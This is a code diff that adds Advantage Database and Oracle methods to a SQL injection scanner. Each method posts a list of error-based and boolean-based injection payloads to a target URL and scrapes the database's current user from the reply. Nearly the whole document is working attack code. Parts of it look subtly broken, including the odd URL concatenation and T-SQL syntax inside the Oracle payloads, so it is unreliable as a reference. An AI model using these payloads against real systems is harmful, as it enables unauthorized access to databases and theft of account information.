@@ -69,9 +69,59 @@ class SQLInjectionScanner:
 
     async def perform_advantage_get_current_user(self):
         print("Advantage Database: Retrieving current user...")
+        async with aiohttp.ClientSession() as session:
+            unique_responses = set()
+
+            for query in [
+                f"1' OR 1=CONVERT(int, (SELECT current_user FROM system.iota)); --",
+                f"1' OR 1=CONVERT(int, (SELECT user FROM system.iota)); --",
+                f"1' OR 1=CONVERT(int, (SELECT name FROM system.iota)); --",
+                f"1' OR 1=CONVERT(int, (SELECT CURRENT_CONNECTION FROM system.iota)); --",
+                f"1' OR SUBSTRING((SELECT user FROM system.iota), 1, 1) = 'a'; --",
+                f"1' OR IF(1=1, (SELECT user FROM system.iota) LIKE 'a%', 0); --",
+            ]:
+                post_data = {}
+                full_url = f'{self.target_url}+{query}'
+
+                try:
+                    async with session.post(full_url, data=post_data) as response:
+                        result = await response.text()
+                        soup = BS(result, 'html.parser')
+                        current_user = soup.find('div', class_='current-user').text
+
+                        if current_user not in unique_responses:
+                            unique_responses.add(current_user)
+                            print(f"Advantage Database: Retrieving current user response for query '{query}': {current_user}")
+                except Exception as e:
+                    print(f"Advantage Database: Error performing POST request for query '{query}': {e}")
 
     async def perform_oracle_get_current_user(self):
         print("Oracle: Retrieving current user...")
+        async with aiohttp.ClientSession() as session:
+            unique_responses = set()
+
+            for query in [
+                f"1' OR 1=CONVERT(int, (SELECT user FROM dual)); --",
+                f"1' OR 1=CONVERT(int, (SELECT sys_context('userenv', 'current_user') FROM dual)); --",
+                f"1' OR 1=CONVERT(int, (SELECT sys_context('userenv', 'session_user') FROM dual)); --",
+                f"1' OR 1=CONVERT(int, (SELECT sys_context('userenv', 'os_user') FROM dual)); --",
+                f"1' OR SUBSTR((SELECT user FROM dual), 1, 1) = 'a'; --",
+                f"1' OR IF(1=1, (SELECT user FROM dual) LIKE 'a%', 0); --",
+            ]:
+                post_data = {}
+                full_url = f'{self.target_url}+{query}'
+
+                try:
+                    async with session.post(full_url, data=post_data) as response:
+                        result = await response.text()
+                        soup = BS(result, 'html.parser')
+                        current_user = soup.find('div', class_='current-user').text
+
+                        if current_user not in unique_responses:
+                            unique_responses.add(current_user)
+                            print(f"Oracle: Retrieving current user response for query '{query}': {current_user}")
+                except Exception as e:
+                    print(f"Oracle: Error performing POST request for query '{query}': {e}")
 
     async def perform_postgre_get_current_user(self):
         print("PostgreSQL: Retrieving current user...")
@@ -148,7 +198,7 @@ async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
     parser.add_argument("target_url", help="Target URL")
     args = parser.parse_args()
-    scanner = await SQLInjectionScanner.create(args.target_url, args.database_type)
+    await SQLInjectionScanner.create(args.target_url)
     
 if __name__ == "__main__":
     asyncio.run(main())
